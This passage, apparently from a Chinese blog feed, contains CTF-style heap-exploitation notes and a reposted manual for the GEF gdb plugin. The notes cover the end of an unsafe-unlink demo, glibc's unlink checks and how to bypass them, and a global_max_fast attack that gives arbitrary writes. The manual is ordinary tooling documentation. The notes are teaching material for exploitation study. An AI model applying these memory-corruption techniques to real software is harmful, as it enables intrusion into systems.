is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们有个全部变量<code>chunk0_ptr</code>来保存malloc的地址，然后紧接着局部变量<code>chunk1_ptr</code>保存下一次malloc的地址。假设<code>chunk0</code>可以溢出，我们为了利用<code>free</code>函数时<code>unlink</code>操作，需要在<code>chunk0</code>的数据部分构造fake chunk（包括size,fd,bk），接着绕过<code>unlink</code>的防御机制，然后覆盖<code>chunk1</code>的堆头来满足释放<code>chunk1</code>时发生<code>consolidate backward</code>，unlink<code>chuck0</code>。 这样翻译过来就是<code>chunk0_ptr=(uint64_t *)(&amp;chunk0_ptr-3)</code>，意味着<code>chunk0_ptr</code>指向了<code>chunk0_ptr[-3]</code>。之后给<code>chunk0_ptr[3]</code>赋任意可写地址，<code>chunk0_ptr</code>就可以修改该地址的内容，达到任意地址写。</p><p>关键点是绕过<code>unlink</code>的两个约束。 <code>malloc.c</code>的源码可参考<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html。" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html。</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted size vs. prev_size"</span>, P, AV);  \</span><br><span class="line">FD = P-&gt;fd;                                                                      \</span><br><span class="line">BK = P-&gt;bk;                                                                      \</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line"><span class="keyword">else</span> &#123;                                                                      \</span><br><span class="line">    FD-&gt;bk = BK;                                                              \</span><br><span class="line">    BK-&gt;fd = FD;                                                              \</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                              \</span><br><span class="line">        &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                      \</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">            || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">          malloc_printerr (check_action,                                      \</span><br><span class="line">                           <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                           P, AV);                                              \</span><br><span class="line">        <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                      \</span><br><span class="line">            <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      \</span><br><span class="line">              FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      \</span><br><span class="line">            <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">                FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              \</span><br><span class="line">                FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              \</span><br><span class="line">              &#125;                                                              \</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">            P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      \</span><br><span class="line">            P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      \</span><br><span class="line">          &#125;                                                                      \</span><br><span class="line">      &#125;                                                                      \</span><br><span class="line">  &#125;                                                                              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了通过<code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</code>判断，（当然<code>P = chunk0_ptr</code>）根据偏移量计算即可轻松满足。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD = &amp;P - <span class="number">3</span></span><br><span class="line">BK = &amp;P - <span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/images/Heap/unsafe_unlink.jpg" alt="整体结构图"></p><h2 id="一些奇奇怪怪的攻击"><a href="#一些奇奇怪怪的攻击" class="headerlink" title="一些奇奇怪怪的攻击"></a>一些奇奇怪怪的攻击</h2><h3 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global max fast"></a>global max fast</h3><p><a href="https://xz.aliyun.com/t/5082" target="_blank" rel="noopener">参考</a></p><p>global_max_fast 这个全局变量的作用是用来标志fastbin的大小的阈值，小于这个值的堆块会认为是fastbin，使用fastbin的相应机制进行管理</p><p><strong>定义</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s) \ <span class="comment">//设置其默认值，默认值是0x80</span></span></span><br><span class="line">  global_max_fast = (((s) == <span class="number">0</span>)                           \</span><br><span class="line">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line">#define get_max_fast() global_max_fast</span><br></pre></td></tr></table></figure><p>fastbin的单链表管理是比较简单的，与<code>global_max_fast</code>相关且需要注意的代码则是fastbin 所对应的index获取以及index所对应的指针获取的代码，即<code>fastbin_index</code>宏以及<code>fastbin</code>宏，对应代码如下：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#define</span> <span class="selector-tag">fastbin_index</span>(sz) \</span><br><span class="line">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#define</span> <span class="selector-tag">fastbin</span>(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br></pre></td></tr></table></figure><p>可以看到这两个宏仅仅是利用偏移来定位数组的指针，但是arena所对应的<code>malloc_state</code>中fastbins数组相关的定义为：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mfastbinptr</span> <span class="selector-tag">fastbinsY</span><span class="selector-attr">[NFASTBINS]</span></span><br><span class="line"></span><br><span class="line"><span class="selector-id">#define</span> <span class="selector-tag">NFASTBINS</span>  (fastbin_index (request2size (MAX_FAST_SIZE)) + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>到这里问题就比较明显了，如果可以改写<code>global_max_fast</code>为一个较大的值，然后释放一个较大的堆块时，由于fastbins数组空间是有限的，其相对偏移将会往后覆盖，如果释放堆块的size可控，就可实现往fastbins数组（main_arena）后的<code>任意地址</code>写入所堆块的地址。</p><p>即利用<code>global_max_fast</code>进行相关的攻击</p><h3 id="tow-chunk"><a href="#tow-chunk" class="headerlink" title="tow chunk"></a>tow chunk</h3><h3 id="small-bin-attack-2-30"><a href="#small-bin-attack-2-30" class="headerlink" title="small bin attack(2.30)"></a>small bin attack(2.30)</h3><h3 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h3><p><a href="https://www.anquanke.com/post/id/202387" target="_blank" rel="noopener">参考</a></p><h2 id="附送-：-最后的pwndbg调式demo（堆类）"><a href="#附送-：-最后的pwndbg调式demo（堆类）" class="headerlink" title="附送 ： 最后的pwndbg调式demo（堆类）"></a>附送 ： 最后的pwndbg调式demo（堆类）</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>gef</title>
      <link href="pwn/gef/gef/"/>
      <url>pwn/gef/gef/</url>
      
        <content type="html"><![CDATA[<h1 id="gef使用"><a href="#gef使用" class="headerlink" title="gef使用"></a>gef使用</h1><p>转载自<a href="[https://www.lhyerror404.cn/2019/05/29/gef-%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C](https://www.lhyerror404.cn/2019/05/29/gef-使用手册)">Saoohire’s Blog</a></p><p>本人比较懒，作者记载的又比较好，所以直接拿来用。 附上版权声明</p><a id="more"></a><h2 id="aliases-命令"><a href="#aliases-命令" class="headerlink" title="aliases 命令"></a>aliases 命令</h2><p>列举出所有的简写命令(别名)</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gef➤  aliases</span><br><span class="line">[+] Aliases defined:</span><br><span class="line">fmtstr-helper                   →  <span class="keyword">format</span>-string-helper</span><br><span class="line">telescope                       →  dereference</span><br><span class="line">dps                             →  dereference</span><br><span class="line">dq                              →  <span class="keyword">hexdump</span> qword</span><br><span class="line">dd                              →  <span class="keyword">hexdump</span> dword</span><br><span class="line">dw                              →  <span class="keyword">hexdump</span> word</span><br><span class="line">dc                              →  <span class="keyword">hexdump</span> byte</span><br><span class="line"><span class="keyword">cs</span>-<span class="keyword">dis</span>                          →  capstone-disassemble</span><br><span class="line">ctx                             →  context</span><br><span class="line">start-<span class="keyword">break</span>                     →  entry-<span class="keyword">break</span></span><br><span class="line">ps                              →  process-<span class="keyword">search</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h3 id="创建-删除-简写命令-别名"><a href="#创建-删除-简写命令-别名" class="headerlink" title="创建/删除 简写命令(别名)"></a>创建/删除 简写命令(别名)</h3><p>GEF定义了自己的别名机制，该机制覆盖了GDB提供的传统别名。</p><p>用户可以通过编辑位于<code>~/.gef.rc</code>的GEF配置文件来创建/修改/删除别名。</p><p>别名必须位于配置文件的“aliases”部分中。</p><p>创建新别名就像在本节中创建新条目一样简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nano ~/.gef.rc</span><br><span class="line">[...]</span><br><span class="line">[aliases]</span><br><span class="line">my-new-alias = gdb-or-gef-command &lt;arg1&gt; &lt;arg2&gt; &lt;etc...&gt;</span><br></pre></td></tr></table></figure><h3 id="加入-PEDA-或-WinDBG的喜好设定"><a href="#加入-PEDA-或-WinDBG的喜好设定" class="headerlink" title="加入 PEDA 或 WinDBG的喜好设定"></a>加入 PEDA 或 WinDBG的喜好设定</h3><p>例如对于那些使用WinDBG并喜欢其命令的人（比如我），可以通过GEF别名将它们集成到GDB中，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ nano ~/.gef.rc</span><br><span class="line">[...]</span><br><span class="line">[aliases]</span><br><span class="line"><span class="comment"># some windbg aliases</span></span><br><span class="line">dps = dereference</span><br><span class="line">dq = hexdump qword</span><br><span class="line">dd = hexdump dword</span><br><span class="line">dw = hexdump word</span><br><span class="line">dc = hexdump byte</span><br><span class="line">dt = pcustom</span><br><span class="line">bl = info breakpoints</span><br><span class="line">bp = <span class="built_in">break</span></span><br><span class="line">be = <span class="built_in">enable</span> breakpoints</span><br><span class="line">bd = <span class="built_in">disable</span> breakpoints</span><br><span class="line">bc = delete breakpoints</span><br><span class="line">tbp = tbreak</span><br><span class="line">tba = thbreak</span><br><span class="line">pa = advance</span><br><span class="line">ptc = finish</span><br><span class="line">t = stepi</span><br><span class="line">p = nexti</span><br><span class="line">g = gef run</span><br><span class="line">uf = disassemble</span><br></pre></td></tr></table></figure><p>注意：Gef本身就已经支持了这里面的许多别名 (例如<code>eb</code>命令)。</p><p>这里有一些PEDA别名用于过去使用PEDA的人。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># some peda aliases</span></span><br><span class="line">telescope = dereference</span><br><span class="line">start = entry-break</span><br><span class="line">stack = dereference <span class="variable">$sp</span> 10</span><br><span class="line">argv = show args</span><br><span class="line">kp = info stack</span><br><span class="line">findmem = search-pattern</span><br></pre></td></tr></table></figure><p>下次加载GDB（和GEF）时将加载这些新增的别名。 或者您可以使用以下命令强制GEF重新加载设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef restore</span><br></pre></td></tr></table></figure><h2 id="aslr-命令"><a href="#aslr-命令" class="headerlink" title="aslr 命令"></a>aslr 命令</h2><p>轻松的在被调试的二进制文件上检查，启用或禁用ASLR。</p><p>检查ASLR启用状态:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  aslr</span><br><span class="line">ASLR <span class="keyword">is</span> currently disabled</span><br></pre></td></tr></table></figure><p>启用ASLR:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  aslr <span class="keyword">on</span></span><br><span class="line">[+] Enabling ASLR</span><br><span class="line">gef➤  aslr</span><br><span class="line">ASLR <span class="keyword">is</span> currently enabled</span><br></pre></td></tr></table></figure><p>禁用ASLR:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gef</span>➤  aslr <span class="literal">off</span></span><br><span class="line">[+] Disabling ASLR</span><br></pre></td></tr></table></figure><p><strong>注意</strong>: 此命令不能影响已加载的进程，以后GDB将附加到该进程。 禁用随机化的唯一方法是设置内核设置<code>/proc/sys/kernel/randomize_va_space</code> 为0。</p><h2 id="assemble-命令"><a href="#assemble-命令" class="headerlink" title="assemble 命令"></a>assemble 命令</h2><p>如果您已经安装了keystone，那么gef将提供一个方便的命令来将本机指令直接组装到您当前正在调试的体系结构的操作码上。</p><p>通过 <code>assemble</code> 或它的别名来调用该命令 <code>asm</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ asm [INSTRUCTION [; INSTRUCTION ...]]</span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/DH1b1t0vx5Nw.png" alt="mark"></p><p>使用<code>-l LOCATION</code>选项，<code>gef</code>会将<code>keystone</code>生成的汇编代码直接写入指定的内存位置。 这使得简单地覆盖操作码非常方便。</p><p><img src="../../../../../../program/writing/images/gef/ygmPdwO0SpPI.png" alt="mark"></p><h2 id="canary-命令"><a href="#canary-命令" class="headerlink" title="canary 命令"></a>canary 命令</h2><p>如果使用Smash Stack Protector（SSP）编译当前调试的进程即<code>-fstack-protector</code>标志已传递给编译器，则此命令将显示该<code>canary</code>的值。 这样可以方便地避免在内存中手动搜索此值。</p><p>命令<code>canary</code>不接受任何参数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ canary</span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/UDHcCOlht3hN.png" alt="mark"></p><h2 id="capstone-disassemble-命令"><a href="#capstone-disassemble-命令" class="headerlink" title="capstone-disassemble 命令"></a>capstone-disassemble 命令</h2><p>如果已安装 <a href="http://capstone-engine.org/" target="_blank" rel="noopener"><code>capstone</code></a> 库及其Python绑定，则可以使用它来反汇编调试会话中的任何内存。 这个插件的创建是为了提供“GDB”的反汇编功能的替代方案，它有时会让事情变得混乱。</p><p>您可以使用其别名<code>cs-disassemble</code>或<code>cs</code>加要反汇编的位置。 如果没有指定位置，它将使用<code>$pc</code>。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ <span class="keyword">cs</span> main</span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/seTAmkzMJO99.png" alt="mark"></p><h2 id="checksec-命令"><a href="#checksec-命令" class="headerlink" title="checksec 命令"></a>checksec 命令</h2><p><code>checksec</code> 命令来源于 <a href="https://gef.readthedocs.io/en/latest/commands/www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener"><code>checksec.sh</code></a>。 它提供了一种方便的方法来确定在二进制文件中启用了哪些安全保护。</p><p>您可以在当前调试的进程上使用该命令：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">gef➤</span>  <span class="string">checksec</span></span><br><span class="line"><span class="string">[+]</span> <span class="string">checksec</span> <span class="string">for</span> <span class="string">'/vagrant/test-bin'</span></span><br><span class="line"><span class="attr">Canary:</span>                                           <span class="literal">No</span></span><br><span class="line"><span class="attr">NX Support:</span>                                       <span class="literal">Yes</span></span><br><span class="line"><span class="attr">PIE Support:</span>                                      <span class="literal">No</span></span><br><span class="line"><span class="attr">No RPATH:</span>                                         <span class="literal">Yes</span></span><br><span class="line"><span class="attr">No RUNPATH:</span>                                       <span class="literal">Yes</span></span><br><span class="line"><span class="attr">Partial RelRO:</span>                                    <span class="literal">Yes</span></span><br><span class="line"><span class="attr">Full RelRO:</span>                                       <span class="literal">No</span></span><br></pre></td></tr></table></figure><p>或者直接指定要检查的二进制文件，例如：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>gdb -ex <span class="string">"checksec ./tests/test-x86"</span></span><br></pre></td></tr></table></figure><h2 id="config-命令"><a href="#config-命令" class="headerlink" title="config 命令"></a>config 命令</h2><p>除了可以从<code>_~/.gef.rc~</code>读取配置外, 还可以在运行时使用<code>gef config</code>命令配置<code>gef</code>。</p><p>要查看加载的所有命令的所有设置：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef <span class="built_in">config</span></span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/ng9ucXcTKJDJ.png" alt="mark"></p><p>或者获取某一个设置项的值:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef<span class="built_in"> config </span>pcustom.struct_path</span><br></pre></td></tr></table></figure><p>当然，您可以编辑这些设置的值。 例如，如果要在抵达断点显示当前上下文之前清除屏幕：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef<span class="built_in"> config </span>context.clear_screen 1</span><br></pre></td></tr></table></figure><p>要将<code>GEF</code>的当前设置保存到系统，以使这些选项在所有未来的<code>GEF</code>会话中保持不变，只需运行：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef save</span><br><span class="line">[+] <span class="keyword">Configuration</span> saved <span class="keyword">to</span> <span class="string">'/home/vagrant/.gef.rc'</span></span><br></pre></td></tr></table></figure><p>启动时，如果<code>gef</code>找到文件<code>${HOME}/.gef.rc</code>，它将自动加载其值。</p><p>要在会话期间重新加载设置，只需运行：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef restore</span><br><span class="line">[<span class="meta">+</span>] Configuration <span class="keyword">from</span> <span class="string">'/home/hugsy/.gef.rc'</span> restored</span><br></pre></td></tr></table></figure><p>您也可以在<code>gdb</code>会话之外调整此配置文件以满足您的需要。</p><h2 id="context-命令"><a href="#context-命令" class="headerlink" title="context 命令"></a>context 命令</h2><p><img src="../../../../../../program/writing/images/gef/91PFcIyCbRdo.png" alt="mark"></p><p><code>gef</code>（与<code>PEDA</code>或<code>fG! famous gdbinit</code>不同）在遇到断点时提供全面的上下文菜单。</p><ul><li>寄存器上下文框显示当前寄存器值。 红色值表示自上次执行停止以来该寄存器的值已更改。 它可以方便地跟踪值。 也可以通过reg命令访问和/或取消引用寄存器值。</li><li>堆栈上下文框显示堆栈指针寄存器指向的内存中的10个（默认情况下可以调整）条目。 如果这些值是指针，则它们被连续解除引用。</li><li>代码上下文框显示要执行的下一条指令，默认显示10条指令（默认情况下可以调整）。</li></ul><h3 id="编辑上下文布局"><a href="#编辑上下文布局" class="headerlink" title="编辑上下文布局"></a>编辑上下文布局</h3><p><code>gef</code>允许您通过重新排列显示上下文的顺序来配置您自己的显示设置。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.layout</span><br></pre></td></tr></table></figure><p>目前有6个部分可以显示：</p><ul><li><code>legend</code> : 颜色代码的文字说明</li><li><code>regs</code> : 寄存器的状态</li><li><code>stack</code> : <code>$sp</code> 寄存器指向的内存内容</li><li><code>code</code> : 正在执行的代码</li><li><code>args</code> : 如果在函数调用处停止，则打印调用参数</li><li><code>source</code> : 如果用source编译，这将显示相应的源代码行</li><li><code>threads</code> : 所有线程</li><li><code>trace</code> : 执行调用跟踪</li><li><code>extra</code> : 如果检测到漏洞（易受攻击的格式字符串，堆漏洞等），它将显示在此窗格中</li><li><code>memory</code> : 查看任意内存位置</li></ul><p>要隐藏一个部分，只需使用<code>context.layout</code>设置，并在部分名称前加上<code>-</code>或者省略它。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.layout <span class="string">"-legend regs stack code args -source -threads -trace extra memory"</span></span><br></pre></td></tr></table></figure><p>此配置不会显示<code>source</code>，<code>threads</code>和<code>trace</code>部分。</p><p><code>memory</code>窗格将显示<code>memory</code>命令指定的所有位置的内容。 例如，</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ <span class="keyword">memory</span> watch $sp <span class="number">0x40</span> byte</span><br></pre></td></tr></table></figure><p>这将打印堆栈的0x40字节的hexdump版本。 此命令便于跟踪内存中任意位置的变化。 跟踪位置可以使用<code>memory unwatch</code>逐个删除，或者与<code>memory reset</code>一起删除。</p><p>大多数部分的大小也可以自定义：</p><ul><li><code>nb_lines_stack</code> ：配置要显示的堆栈行数。</li><li><code>nb_lines_backtrack</code> ：配置要显示的回溯线数。</li><li><code>nb_lines_code</code> 和<code>nb_lines_code_prev</code> ：分别配置在PC之后和之前显示的行数。</li><li><code>context.nb_lines_threads</code> ：确定线程窗格内显示的行数。 在调试大量多线程应用程序（apache2，firefox等）时，这很方便。 它接收一个整数作为值：如果该值为“-1”，则将显示所有线程状态。 否则，如果该值设置为“N”，则最多将显示“N”个线程状态。</li></ul><p>要使堆栈在顶部显示最大堆栈地址（即向下增加堆栈），请启用以下设置：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.grow_stack_down <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>如果保存的指令指针不在显示的堆栈部分内，则创建一个包含已保存的ip并且根据架构指示帧指针的部分。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00007fffffffc9e8</span>│+<span class="number">0x00</span>: <span class="number">0x00007ffff7a2d830</span>  →  &lt;__main+<span class="number">240</span>&gt; mov edi, eax    ($current_frame_savedip)</span><br><span class="line"><span class="number">0x00007fffffffc9e0</span>│+<span class="number">0x00</span>: <span class="number">0x00000000004008c0</span>  →  &lt;__init+<span class="number">0</span>&gt; push r15    ← $rbp</span><br><span class="line">. . . (<span class="number">440</span> bytes skipped)</span><br><span class="line"><span class="number">0x00007fffffffc7e8</span>│+<span class="number">0x38</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fffffffc7e0</span>│+<span class="number">0x30</span>: <span class="number">0x0000000000000026</span> (<span class="string">"&amp;"</span>?)</span><br><span class="line"><span class="number">0x00007fffffffc7d8</span>│+<span class="number">0x28</span>: <span class="number">0x0000000001958ac0</span></span><br><span class="line"><span class="number">0x00007fffffffc7d0</span>│+<span class="number">0x20</span>: <span class="number">0x00007ffff7ffa2b0</span>  →  <span class="number">0x5f6f7364765f5f00</span></span><br><span class="line"><span class="number">0x00007fffffffc7c8</span>│+<span class="number">0x18</span>: <span class="number">0x00007fff00000000</span></span><br><span class="line"><span class="number">0x00007fffffffc7c0</span>│+<span class="number">0x10</span>: <span class="number">0x00007fffffffc950</span>  →  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fffffffc7b8</span>│+<span class="number">0x08</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fffffffc7b0</span>│+<span class="number">0x00</span>: <span class="number">0x00007fffffffc7e4</span>  →  <span class="number">0x0000000000000000</span>      ← $rsp</span><br></pre></td></tr></table></figure><h3 id="将上下文输出重定向到另一个-TTY-file"><a href="#将上下文输出重定向到另一个-TTY-file" class="headerlink" title="将上下文输出重定向到另一个 TTY/file"></a>将上下文输出重定向到另一个 TTY/file</h3><p>默认情况下，<code>gef</code>上下文将显示在当前TTY上。 这可以通过设置<code>context.redirect</code>变量来覆盖，以将上下文发送到另一个部分。</p><p>为此，请使用<code>gef config</code>选择你希望上下文重定向到的TTY/file/socket等。</p><p>在提示符中输入命令<code>tty</code>：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tty</span><br><span class="line">/dev/pts/<span class="number">0</span></span><br></pre></td></tr></table></figure><p>接下来我们把结果告诉 <code>gef</code> !</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.redirect /dev/pts/0</span><br></pre></td></tr></table></figure><p>成功: <img src="../../../../../../program/writing/images/gef/SLRFj2IWzVzx.png" alt="mark"></p><p>要恢复正常，请删除以下值：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.redirect <span class="string">""</span></span><br></pre></td></tr></table></figure><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><ul><li>首先显示代码部分，然后寄存器，栈，隐藏其他所有内容：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.layout <span class="string">"code regs stack"</span></span><br></pre></td></tr></table></figure><ul><li>在抵达断点时停止显示上下文部分：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.<span class="builtin-name">enable</span> 